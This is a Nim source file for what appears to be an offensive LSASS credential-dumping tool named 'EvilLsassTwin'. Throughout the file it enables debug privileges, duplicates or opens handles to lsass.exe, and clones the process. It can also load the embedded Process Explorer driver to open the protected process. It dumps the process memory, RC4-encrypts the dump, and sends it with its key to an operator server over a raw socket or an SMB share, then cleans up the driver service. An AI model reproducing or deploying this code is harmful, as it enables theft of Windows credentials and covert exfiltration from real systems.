import 
    winim,
    ptr_math,
    CreateDump,
    Helper,
    std/[strformat, strutils, sequtils, dynlib, tables, net, httpclient, cpuinfo, times, random, os]

type
    exfilMethod = enum
        useSMB, useRaw
    
    minidumpMethod = enum
        useCustom, useTraditional

# Operator Toggles #
const 
    serverIP = "0.0.0.0"
    serverPort = 6500
    smbShare = fmt"\\{serverIP}\MalwareShare\EvilTwin.bin"

    saveToFile: bool = false

    mdMethod: minidumpMethod = useCustom
    exfil: exfilMethod = useSMB
# Operator Toggles #

const 
    procExp = staticRead("PROCEXP152.SYS")
    IOCTL_OPEN_PROTECTED_PROCESS_HANDLE = cast[uint32](0x8335003c)

    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?`~"

var 
    hSCManager: SC_HANDLE
    hService: SC_HANDLE
    hDriver: HANDLE
    ss: SERVICE_STATUS

var 
    pid: ULONG

    hPPL: HANDLE = 0

    bytesReturned: DWORD

    outFile: HANDLE

    rc4KeyStr: string

    isTemp: bool = false

    isClone: bool = false

proc isElevatedProcess(): bool =
    var isElevated: bool
    var token: HANDLE

    if OpenProcessToken(cast[HANDLE](-1), TOKEN_QUERY, addr token) != 0:
        var elevation: TOKEN_ELEVATION
        var token_check: DWORD = cast[DWORD](sizeof TOKEN_ELEVATION)
        if GetTokenInformation(token, tokenElevation, addr elevation, cast[DWORD](sizeof elevation), addr token_check) != 0:
            isElevated = if elevation.TokenIsElevated != 0: true else: false
    CloseHandle(token)
    return isElevated

proc SetPrivilege(hToken: HANDLE, lpszPrivilege: LPCTSTR, bEnablePrivilege: BOOL): bool =
    var
        tp: TOKEN_PRIVILEGES
        luid: LUID

    if LookupPrivilegeValue(NULL, lpszPrivilege, addr luid) == 0:
        echo "[-] LookupPrivilegeValue error: ", GetLastError()
        return true

    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = if bEnablePrivilege: SE_PRIVILEGE_ENABLED else: SE_PRIVILEGE_REMOVED

    if AdjustTokenPrivileges(hToken, cast[WINBOOL](FALSE), addr tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), cast[PTOKEN_PRIVILEGES](NULL), cast[PDWORD](NULL)) == 0:
        echo "[-] AdjustTokenPrivileges error: ", GetLastError()
        return false

    if GetLastError() == ERROR_NOT_ALL_ASSIGNED:
        echo "[-] The token does not have the specified privilege."
        return false

    return true

proc enumLsassHandles(): seq[(ULONG, HANDLE)] =
    var 
        lsassHandles: seq[(ULONG, HANDLE)] = @[]
        handleInfo = initTable[ULONG, seq[USHORT]]() #Key = PID, Value = Seq[HANDLE]
        dupHandle: HANDLE
        rtrnLength: ULONG = 0
        shiBuffer = VirtualAlloc(NULL, sizeof(SYSTEM_HANDLE_INFORMATION), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
   
    status = NtQuerySystemInformation(0x10, cast[PSYSTEM_HANDLE_INFORMATION](shiBuffer), cast[ULONG](sizeof(SYSTEM_HANDLE_INFORMATION)), addr rtrnLength)
    while status == STATUS_INFO_LENGTH_MISMATCH: 
        VirtualFree(shiBuffer, 0, MEM_RELEASE)
        #[echo "[!] NtQuerySystemInformation return length: ", rtrnLength
        if VirtualFree(shiBuffer, 0, MEM_RELEASE) != 0:
            echo "[!] Memory Buffer released!"
        ]#
        shiBuffer = VirtualAlloc(NULL, rtrnLength, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
        status = NtQuerySystemInformation(0x10, cast[PSYSTEM_HANDLE_INFORMATION](shiBuffer), rtrnLength, addr rtrnLength)
    if NT_SUCCESS(status) != true:
        echo "[-] Could Not Retrieve System Handle Information!"
        return @[]
    
    var shi = cast[PSYSTEM_HANDLE_INFORMATION](shiBuffer)
    var handleC = shi.Count
    echo "[!] Number of Handles: ", handleC
    var shiEnd = shiBuffer + rtrnLength

    #discard readLine(stdin)
    var sHandle = shiBuffer + sizeof(LONG)

    while cast[int](sHandle) < cast[int](shiEnd):
        sHandle += sizeof(LONG)
        var sysHandle = cast[PSYSTEM_HANDLE_INFORMATION](sHandle).Handle[0]
        if not handleInfo.hasKey(sysHandle.OwnerPid) and (sysHandle.ObjectType != 0 and sysHandle.HandleFlags != 0 and (sysHandle.HandleValue != 0 and sysHandle.HandleValue != 65535)):
            handleInfo[sysHandle.OwnerPid] = @[]
            handleInfo[sysHandle.OwnerPid].add(sysHandle.HandleValue)

    echo "[!] Attempting to Duplicate Found Handles"
    for pid in handleInfo.keys:
        
        if pid == 4:
            continue
        
        for syshandle in handleInfo[pid]:
            var pHandle: HANDLE = OpenProcess(PROCESS_DUP_HANDLE, FALSE, cast[DWORD](pid))
            #[if GetLastError() == 0:
                echo "[+] OpenProcess Succeeded! Handle: ", toHex(pHandle)
            else:
                continue]#
            if GetLastError() != 0:
                continue
            status = NtDuplicateObject(pHandle, cast[HANDLE](syshandle), cast[HANDLE](-1), addr dupHandle, PROCESS_CREATE_PROCESS, 0, 0)
            #status = NtDuplicateObject(pHandle, cast[HANDLE](-1), GetCurrentProcess(), addr dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)
            if NT_SUCCESS(status) != true:
                continue
            #[else:
                echo "[+] NtDuplicateObject Succeeded! New Handle: 0x", toHex(dupHandle)
            ]#

            var oinfo: OBJECT_TYPE_INFORMATION
            var oinfoBuffer = VirtualAlloc(NULL, sizeof(OBJECT_TYPE_INFORMATION), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
            var ortrnLength: ULONG

            status = NtQueryObject(dupHandle, cast[OBJECT_INFORMATION_CLASS](2), oinfoBuffer, cast[ULONG](sizeof(OBJECT_TYPE_INFORMATION)), addr ortrnLength)
            
            while status == STATUS_INFO_LENGTH_MISMATCH: 
                VirtualFree(oinfoBuffer, 0, MEM_RELEASE)
                #[echo "[!] NtQueryObject Failed Due to STATUS_INFO_LENGTH_MISMATCH Error! Length Returned: ", ortrnLength
                if VirtualFree(oinfoBuffer, 0, MEM_RELEASE) != 0:
                    echo "[!] Memory Buffer Released!"
                echo "[!] Retrying..."
                ]#
                oinfoBuffer = VirtualAlloc(NULL, ortrnLength, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
                status = NtQueryObject(dupHandle, cast[OBJECT_INFORMATION_CLASS](2), oinfoBuffer, ortrnLength, addr ortrnLength)

            

            if NT_SUCCESS(status) != true:
                echo "[-] Failed Retrieving Information about Handle! | Error Code: ", toHex($status)
                return @[]
            
            oinfo = cast[OBJECT_TYPE_INFORMATION](oinfoBuffer)

            var 
                pname: cstring
                pname_size: DWORD = 4096
                
                oinfoTypeNameBufferValuePtr = oinfoBuffer+0x68
                oinfoTypeNameBufferValue = cast[PWSTR](oinfoTypeNameBufferValuePtr)

            if $oinfoTypeNameBufferValue == "Process":
                if QueryFullProcessImageNameW(dupHandle, 0, pname, addr pname_size) != 0:
                    echo "[+] Process Handle Found!"
                    if cmpIgnoreCase(winim.winstr.`$`pname, "lsass.exe") == 0:
                        echo "[+] Suitable Handle to LSASS Found from PID: ", pid, " | HANDLE: ", toHex($syshandle), "\n"
                        lsassHandles.add((pid, dupHandle))
                    else:
                        CloseHandle(cast[HANDLE](syshandle))
                        CloseHandle(dupHandle)
                else:
                    echo "[-] Failed Retrieving Process Name! Error Code: ", GetLastError()
                    return @[]
    VirtualFree(shiBuffer, 0, MEM_RELEASE)
    return lsassHandles

proc newFile(): int =
    echo "[!] Creating File..."
    outFile = CreateFile("twin.txt", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))

    if outFile == INVALID_HANDLE_VALUE:
        echo "[-] File Could Not Be Created In Current Directory! Error: ", GetLastError(), "\n"
        return -1

    if isTemp:
        var IoStatusBlock: IO_STATUS_BLOCK
        var fileDI: FILE_DISPOSITION_INFORMATION
        
        fileDI.DoDeleteFile = TRUE
        status = NtSetInformationFile(outFile, addr IoStatusBlock, addr fileDI, cast[ULONG](sizeof(fileDI)), 13)
    
        if NT_SUCCESS(status) == false:
            echo "[-] File Could Not Be Marked as Delete on Close! Error: ", toHex($status)
            return -1
        echo "[+] File Created Successfully and Marked as Delete on Close!"
    return 0

proc exfilData(pDumpData: pointer, size: int): void =
    if exfil == useRaw:
        # Raw Socket Data Exfiltration
        var dataPointer = pDumpData

        let socket = newSocket()
    
        try:
            socket.connect(serverIP, Port(serverPort))
        except:
            echo "\n[-] Could Not Connect to Server!\n[!] Quitting..."
            quit(1)
        
        echo "[!] Sending Encryption Key to Server..."
        if not socket.trySend(rc4KeyStr):
            echo "[-] Could Not Send Encryption Key to Server!"
    
        echo "[!] Sending Data to Server..."
        var bytesSent: int = 0
        while dataPointer <= (pDumpData + size):
            if (size.int - bytesSent) < 4096:
                bytesSent += socket.send(dataPointer, (size.int - bytesSent))
                break
            else: 
                bytesSent += socket.send(dataPointer, 4096)
                dataPointer += 4096
    
        echo "\n[!] Sent ", bytesSent, " Bytes"
        if bytesSent < size.int:
            echo "[!] Bytes Sent (", bytesSent, ") Less Than Section Data (", size, ")...\n[!] File May Be Corrupted on Server"
        
        defer: socket.close()

    elif exfil == useSMB:
        # SMB Data Exfiltration
        var dwBytesWritten: DWORD

        echo fmt"[!] Sending Data to {smbShare}"
        var smbFile = CreateFile(smbShare, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
        if smbFile != INVALID_HANDLE_VALUE:
            if WriteFile(smbFile, pDumpData, size.DWORD, addr dwBytesWritten, NULL) == 0:
                echo "[-] Could Not Send Data Over SMB!\n[!] Quitting..."
                quit(1)
        else:
            echo "[-] Could Not Create File on SMB Server!\n[!] Quitting..."
            echo GetLastError()
            quit(1)
        
        echo "[!] Sent ", dwBytesWritten, " Bytes"
        if dwBytesWritten < size.int:
            echo "[!] Bytes Sent (", dwBytesWritten, ") Less Than Section Data (", size, ")...\n[!] File May Be Corrupted on Server"
        CloseHandle(smbFile)
    else:
        echo "[!] Invalid Exfil Method Chosen! Data Will Not Be Sent!"

when isMainModule:
    var
        keyString: USTRING
        dmpBuffer: USTRING
        rc4Key: array[16, char]
        oldProtect: DWORD
        miniDump: WINBOOL
        pDumpData: pointer

    # Encryption Key Generation
    randomize()
    for i in 0 ..< 16:
        rc4Key[i] = cast[char](charset[rand(0 ..< charset.len)])

    var 
        procOA: OBJECT_ATTRIBUTES
        hToken: HANDLE
    
    InitializeObjectAttributes(addr procOA, NULL, 0, cast[HANDLE](NULL), NULL)

    if isElevatedProcess() == false:
        echo "[-] Process Not Running Elevated!\n[!] Quitting..."
        quit(1)

    echo "[!] Checking for Debug privilege..."
    if OpenProcessToken(cast[HANDLE](-1), TOKEN_ADJUST_PRIVILEGES, addr hToken) != 0 and SetPrivilege(hToken, SE_DEBUG_NAME, TRUE) == TRUE:
        echo "[+] Debug privilege enabled!\n"
        discard CloseHandle(hToken)
    else:
        echo "[-] Failed to Enable SeDebugPrivilege\n[!] Quitting..."
        quit(1)
        #discard readLine(stdin)
    
    var 
        dupHandlesSeq = enumLsassHandles()
        victimHandle: HANDLE = cast[HANDLE](NULL)

    {.emit: "char procName[4096];".}
    var 
        procName {.importc, nodecl.}: cstring
        count: int = 1

    if dupHandlesSeq.len == 0:
        echo "[-] No Suitable Handles Could Be Duplicated.\n\n[!] Attempting Risky Operation: Opening Handle Directly to Lsass Process...\n"

        while NtGetNextProcess(victimHandle, MAXIMUM_ALLOWED, 0, 0, addr victimHandle) == 0:
            
            

            if GetProcessImageFileNameA(victimHandle, procName, MAX_PATH) == 0:
                
                echo "[-] Failed to Retrieve Process Name! Error: ", GetLastError(), "\n[!] Quitting..."
                quit(1)

            if lstrcmpiA("lsass.exe", PathFindFileNameA(procName)) == 0:
                pid = GetProcessId(victimHandle)
                echo fmt"[+] Found PID {pid} and Obtained Handle {victimHandle} (0x{toHex(victimHandle)})" 
                break
            
        
        
        if victimHandle == 0 or victimHandle == INVALID_HANDLE_VALUE:
            echo "[-] Could Not Obtain Handle!\n[!] Attempting to Obtain Handle with Kernel Driver..."
            
            echo "\n[!] Checking for SE_LOAD_DRIVER privilege..."
            if OpenProcessToken(cast[HANDLE](-1), TOKEN_ADJUST_PRIVILEGES, addr hToken) != 0 and SetPrivilege(hToken, SE_LOAD_DRIVER_NAME, TRUE):
                echo "[+] SE_LOAD_DRIVER privilege enabled!"
                CloseHandle(hToken)
            else:
                echo "[-] Failed to Enable SeLoadDriverPrivilege\n[!] Cannot Continue Without It..."
        
            echo "\n[!] Finding PID"
            pid = GetProcessByName("lsass.exe")
            echo "[!] Found PID: ", pid, " - 0x", toHex($pid)

            if not "EvilLsassTwin.sys".fileExists:
                try:
                    var driverFile = open("EvilLsassTwin.sys", fmWrite)
                    writeFile("EvilLsassTwin.sys", procExp.toOpenArrayByte(0, procExp.high))
                    driverFile.close()
                    echo "\n[+] Wrote Driver File to Disk!"
                except:
                    echo "\n[-] Could Not Write Driver File to Disk!\n[!] Quitting..."
                    quit(1)

            var ioStat: IO_STATUS_BLOCK

            hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT or SC_MANAGER_CREATE_SERVICE)
            
            if hSCManager == cast[SC_HANDLE](NULL):
                echo "\n[-] OpenSCManager Failed!\n[!] Quitting..."
                quit(1)
            
            hService = CreateService(hSCManager, "EvilLsassTwinService", NULL, SERVICE_START or DELETE or SERVICE_STOP or SERVICE_QUERY_STATUS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, expandFilename("EvilLsassTwin.sys"), NULL, NULL, NULL, NULL, NULL)
            if hService != cast[SC_HANDLE](NULL):
                echo "\n[+] Service Created Successfully!"
            else:
                echo "\n[-] CreateService Failed!"
              
                hService = OpenService(hSCManager, "EvilLsassTwinService", SERVICE_START or DELETE or SERVICE_STOP or SERVICE_QUERY_STATUS)
                if hService == cast[SC_HANDLE](NULL):
                    echo "[-] Could Not Obtain Handle to Service!\n[!] Quitting..."
                    
                    quit(1)
            
            var 
                ssStatus: SERVICE_STATUS_PROCESS
                bytesNeeded: DWORD
                svcStatusQueryResult = QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, cast[LPBYTE](addr ssStatus), cast[DWORD](sizeof(SERVICE_STATUS_PROCESS)), addr bytesNeeded)
            
            if svcStatusQueryResult == 0:
                echo "[-] Cannot Get Service Status Failed!\n[!] Quitting..."
                
                quit(1)
            
            case ssStatus.dwCurrentState:
                of 1:
                    echo "[!] Service Stopped!\n[!] Starting Service!"
                    sleep(10000)

                    if StartService(hService, cast[DWORD](0), NULL) == 0:
                        echo "\n[!] Could Not Start Service!\n[!] Trying again..."
                        sleep(5000)
                        StartService(hService, cast[DWORD](0), NULL)
                    sleep(5000)
                    svcStatusQueryResult = QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, cast[LPBYTE] (addr ssStatus), cast[DWORD](sizeof(SERVICE_STATUS_PROCESS)), addr bytesNeeded)
                    
                    if svcStatusQueryResult == 0:
                        echo "[-] Could Not Query Service Status!"
                        

                    if ssStatus.dwCurrentState == 2:
                        echo "[!] Service Starting!"

                    if ssStatus.dwCurrentState == 4:
                        echo "[+] Service Running!"

                    if ssStatus.dwCurrentState == 1:
                        echo "[!] Service Stopped!"
                of 4:
                    echo "[+] Service Running!"
                else:
                    echo "[!] Unknown Service State..."
            hDriver = CreateFile("\\\\.\\PROCEXP152", GENERIC_ALL, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
            
        
            if hDriver == INVALID_HANDLE_VALUE:
                echo "[-] Handle to Driver Could Not Be Obtained!\n[!] Quitting..."
                echo GetLastError()
                ControlService(hService, SERVICE_CONTROL_STOP, addr ss)
                sleep(10000)
                DeleteService(hService)
                sleep(2000)
                CloseServiceHandle(hService)
                CloseServiceHandle(hSCManager)
                if "EvilLsassTwin.sys".tryRemoveFile():
                    echo "[+] Driver File Removed!"
                else:
                    echo "[-] Driver File Could Not Be Removed!"
                quit(1)

            
            var 
                ulongPID = cast[ULONGLONG](pid)
                dioctlRtn = DeviceIOControl(hDriver, cast[DWORD](IOCTL_OPEN_PROTECTED_PROCESS_HANDLE), addr ulongPID, cast[DWORD](sizeof ulongPID), addr hPPL, cast[DWORD](sizeof HANDLE), addr bytesReturned, NULL)
            
            if dioctlRtn == 0:
                echo "[!] Error Code: ", GetLastError()
            #discard readLine(stdin)

            if hPPL == INVALID_HANDLE_VALUE:
                echo "\n[-] Did Not Receive Handle to Process From Driver!"
            else:
                echo "\n[+] Handle to Process Received From Driver: ", hPPL, " (0x", toHex(hPPL),")\n"
                
                dupHandlesSeq.add((cast[ULONG](pid), hPPL))
           
            
        else:
            isClone = true
            dupHandlesSeq.add((pid, victimHandle))

    if isClone:
        echo "\n[!] Cloning Process..."
        for handleTuple in dupHandlesSeq:
            status = NtCreateProcessEx(addr victimHandle, PROCESS_ALL_ACCESS, addr procOA, handleTuple[1], cast[ULONG](0), cast[HANDLE](NULL), cast[HANDLE](NULL), cast[HANDLE](NULL), FALSE)
            if NT_SUCCESS(status):
                echo "[+] Successfully Cloned to New PID: ", GetProcessId(victimHandle), "\n"
                break
            else:
                echo "[-] Error Cloning Process! Error Code: 0x", toHex($status)
                

        if NT_SUCCESS(status) == false:
            echo "[-] Failed to Clone Process. Quitting..."
            quit(1)
        
    
    if isClone and mdMethod == useCustom:
        var 
            osVersionInfo: OSVERSIONINFOEX
            boolTest: bool = false
        
        osVersionInfo.dwOSVersionInfoSize = cast[DWORD](sizeof(OSVERSIONINFOEX))
        status = RtlGetVersion(addr osVersionInfo)

        getImportantModulesInfo(victimHandle)
        

        
        getMemoryRegions(victimHandle)

        

        var mdump = CreateDump(lsasrvAddress, lsasrvSize, memory64InfoList, memRegionsBuffer, memRegionsBuffer.len, osVersionInfo)
        echo "[!] Dump Data Located at: 0x", toHex(cast[ByteAddress](mdump[0].addr))
        
        echo "\n[!] Encrypting Dump..."
        
        keyString.Buffer = cast[PVOID](addr rc4Key)
        keyString.Length = cast[DWORD](rc4Key.len)
        dmpBuffer.Buffer = mdump[0].addr
        dmpBuffer.Length = mdump.len.int32
        
        if NT_SUCCESS(SystemFunction032(addr dmpBuffer, addr keyString)) == false:
            echo "[-] Could Not Encrypt Data!\n[!]Data Will Be Sent in Plaintext!"
        else:
            stdout.write "[!] RC4 Encryption Key: "
            for keyByte in rc4Key.items: 
                rc4KeyStr.add(toHex(cast[byte](keyByte)))
                stdout.write toHex(cast[byte](keyByte))
            rc4KeyStr.add("\r\n")

        echo "\n"
        if saveToFile:
            var newFileSuccess: int
            newFileSuccess = newFile()
            if newFileSuccess != -1:
                
                if WriteFile(outFile, addr mdump[0], cast[DWORD](mdump.len), NULL, NULL) == TRUE:
                    echo "[!] Data Saved to File!"
                else:
                    echo "[-] Could Not Write to File! Error: ", GetLastError()
        else:
            exfilData(mdump[0].addr, mdump.len)
        
        
        
    elif isClone and mdMethod == useTraditional:
        var newFileSuccess: int
        if saveToFile:
            newFileSuccess = newFile()
        else:
            isTemp = true
            newFileSuccess = newFile()

        if newFileSuccess != -1 and isTemp: 
            miniDump = MiniDumpWriteDump(victimHandle, 0, outFile, 0x00000002, NULL, NULL, NULL)
    
            if miniDump == TRUE:
                echo "[+] Sucessfully Dumped Process!"
                var size: DWORD = GetFileSize(outFile, NULL)
                var hMapping: HANDLE = CreateFileMapping(outFile, NULL, PAGE_READWRITE, 0, 0, NULL)

                pDumpData = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0)
                

                keyString.Buffer = cast[PVOID](addr rc4Key)
                keyString.Length = cast[DWORD](rc4Key.len)
                dmpBuffer.Buffer = pDumpData
                dmpBuffer.Length = size

                if NT_SUCCESS(SystemFunction032(addr dmpBuffer, addr keyString)) == false:
                    echo "[-] Could Not Encrypt Data!\n[!]Data Will Be Sent in Plaintext!"
                else:
                    stdout.write "[!] RC4 Encryption Key: "
                    for keyByte in rc4Key.items: 
                        rc4KeyStr.add(toHex(cast[byte](keyByte)))
                        stdout.write toHex(cast[byte](keyByte))
                    rc4KeyStr.add("\r\n")
                echo "\n"

                exfilData(pDumpData, size.int)
                if UnmapViewOfFile(pDumpData) == FALSE:
                    echo "[!] Error Removing Data from Memory!"
                else:
                    CloseHandle(hMapping)
                    
                
            else: 
                echo "[-] Could Not Dump Process! Error: ", GetLastError()
                echo "\n[!] Quitting..."
                CloseHandle(outFile)
                quit(1)
        elif newFileSuccess != -1 and isTemp == false:
            minidump = MiniDumpWriteDump(victimHandle, 0, outFile, 0x00000002, NULL, NULL, NULL)
            if minidump == FALSE:
                echo "[!] Could Not Dump Process!\n[!] Quitting..."
                quit(1)

    else:
        var newFileSuccess: int
        if saveToFile:
            newFileSuccess = newFile()
        else:
            isTemp = true
            newFileSuccess = newFile()

        if newFileSuccess != -1 and isTemp: 
            miniDump = MiniDumpWriteDump(hPPL, 0, outFile, 0x00000002 or 0x00020000, NULL, NULL, NULL)
    
            if miniDump == TRUE:
                echo "[+] Sucessfully Dumped Process!"
                var size: DWORD = GetFileSize(outFile, NULL)
                var hMapping: HANDLE = CreateFileMapping(outFile, NULL, PAGE_READWRITE, 0, 0, NULL)

                pDumpData = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0)
                

                keyString.Buffer = cast[PVOID](addr rc4Key)
                keyString.Length = cast[DWORD](rc4Key.len)
                dmpBuffer.Buffer = pDumpData
                dmpBuffer.Length = size

                if NT_SUCCESS(SystemFunction032(addr dmpBuffer, addr keyString)) == false:
                    echo "[-] Could Not Encrypt Data!\n[!]Data Will Be Sent in Plaintext!"
                else:
                    
                    stdout.write "[!] RC4 Encryption Key: "
                    for keyByte in rc4Key.items: 
                        rc4KeyStr.add(toHex(cast[byte](keyByte)))
                        stdout.write toHex(cast[byte](keyByte))
                    rc4KeyStr.add("\r\n")
                
                exfilData(pDumpData, size.int)
                if UnmapViewOfFile(pDumpData) == FALSE:
                    echo "[!] Error Removing Data from Memory!"
                else:
                    CloseHandle(hMapping)
                    
            else: 
                echo "[-] Could Not Dump Process! Error: ", GetLastError()
                echo "\n[!] Quitting..."
                
                CloseHandle(outFile)
                quit(1)
        elif newFileSuccess != -1 and isTemp == false:
            miniDump = MiniDumpWriteDump(hPPL, 0, outFile, 0x00000002 or 0x00020000, NULL, NULL, NULL)
            if minidump == FALSE:
                echo "[!] Could Not Dump Process!\n[!] Quitting..."
                quit(1)

        if miniDump == FALSE:
            quit(1)

    echo "\n[!] Cleaning Up..."
    
    for handleTuple in dupHandlesSeq: CloseHandle(handleTuple[1])
    
    
    CloseHandle(outFile)
    if isClone == false:
        CloseHandle(hDriver)
        ControlService(hService, SERVICE_CONTROL_STOP, addr ss)
        sleep(10000)
        DeleteService(hService)
        sleep(2000)
        CloseServiceHandle(hService)
        CloseServiceHandle(hSCManager)
        if "EvilLsassTwin.sys".tryRemoveFile():
                echo "[+] Driver File Removed!\n"
        else:
                echo "[-] Driver File Could Not Be Removed!\n"
    echo "[!] Done!"
